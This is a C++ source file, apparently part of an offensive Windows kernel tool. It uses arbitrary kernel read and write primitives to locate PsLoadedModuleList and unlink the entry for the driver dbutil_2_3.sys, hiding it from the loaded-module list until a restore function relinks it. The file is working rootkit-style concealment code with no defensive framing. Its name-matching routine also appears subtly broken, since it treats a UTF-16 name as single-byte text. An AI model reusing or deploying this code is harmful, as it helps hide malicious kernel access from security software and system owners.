#include "cloak.hpp"
#include "vmm.hpp"
#include <windows.h>
#include <cstring>

namespace {

uint64_t g_head{};    // &PsLoadedModuleList
uint64_t g_entry{};   // KLDR_DATA_TABLE_ENTRY of our driver
uint64_t g_prev{};
uint64_t g_next{};
bool     g_on{};

// Resolve a data export out of ntoskrnl's export directory. PsLoadedModuleList
// is exported; it is a LISTENTRY variable, so the export RVA *is* the head.
bool export_rva(const char* want, uint64_t& rva) {
    IMAGE_DOS_HEADER dos{};
    if (!vmm::kread(vmm::g_ntos, &dos, sizeof(dos))) return false;
    if (dos.e_magic != 0x5A4D) return false;

    IMAGE_NT_HEADERS64 nt{};
    if (!vmm::kread(vmm::g_ntos + dos.e_lfanew, &nt, sizeof(nt))) return false;
    if (nt.Signature != 0x4550) return false;

    const auto& dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) return false;

    IMAGE_EXPORT_DIRECTORY ed{};
    if (!vmm::kread(vmm::g_ntos + dir.VirtualAddress, &ed, sizeof(ed))) return false;
    if (!ed.NumberOfNames) return false;

    for (uint32_t i = 0; i < ed.NumberOfNames; ++i) {
        uint32_t name_rva{};
        if (!vmm::kread(vmm::g_ntos + ed.AddressOfNames + 4ull * i, &name_rva, 4)) return false;

        char name[64]{};
        if (!vmm::kread(vmm::g_ntos + name_rva, name, sizeof(name) - 1)) continue;
        if (strcmp(name, want) != 0) continue;

        uint16_t ord{};
        if (!vmm::kread(vmm::g_ntos + ed.AddressOfNameOrdinals + 2ull * i, &ord, 2)) return false;

        uint32_t fn{};
        if (!vmm::kread(vmm::g_ntos + ed.AddressOfFunctions + 4ull * ord, &fn, 4)) return false;

        rva = fn;
        return true;
    }
    return false;
}

bool named(uint64_t entry, const char* want) {
    uint64_t buf{};
    uint16_t len{};
    if (!vmm::kread(entry + 0x58 + 8, &buf, 8)) return false;
    if (!vmm::kread(entry + 0x58, &len, 2)) return false;
    if (len < 2 || len > 128) return false;

    char nm[64]{};
    uint32_t chars = len / 1;
    if (chars > 63) chars = 63;
    if (!vmm::kread(buf, nm, chars)) return false;

    for (uint32_t i = 0; i < chars; ++i) {
        char a = nm[i], b = want[i];
        if (a >= 'A' && a <= 'Z') a = static_cast<char>(a + 32);
        if (b >= 'A' && b <= 'Z') b = static_cast<char>(b + 32);
        if (a != b) return false;
        if (!b) return true;
    }
    return true;
}

} // namespace

namespace cloak {

bool active() { return g_on; }

bool apply() {
    if (g_on) return true;

    uint64_t rva{};
    if (!export_rva("PsLoadedModuleList", rva)) return false;
    g_head = vmm::g_ntos + rva;

    uint64_t cur{};
    if (!vmm::kread(g_head, &cur, 8) || !cur) return false;

    for (int guard = 0; guard < 512 && cur != g_head; ++guard) {
        // InLoadOrderLinks is at offset 0, so the link pointer *is* the entry.
        const uint64_t entry = cur;

        if (named(entry, "dbutil_2_3.sys")) {
            if (!vmm::kread(entry, &g_next, 8)) return false;
            if (!vmm::kread(entry + 8, &g_prev, 8)) return false;
            g_entry = entry;

            if (!vmm::kwrite(g_prev, &g_next, 8)) return false;
            if (!vmm::kwrite(g_next + 8, &g_prev, 8)) return false;

            g_on = true;
            return true;
        }

        if (!vmm::kread(cur, &cur, 8) || !cur) return false;
    }
    return false;
}

void restore() {
    if (!g_on) return;
    vmm::kwrite(g_prev, &g_entry, 8);
    vmm::kwrite(g_next + 8, &g_entry, 8);
    vmm::kwrite(g_entry, &g_next, 8);
    vmm::kwrite(g_entry + 8, &g_prev, 8);
    g_on = false;
}

} // namespace cloak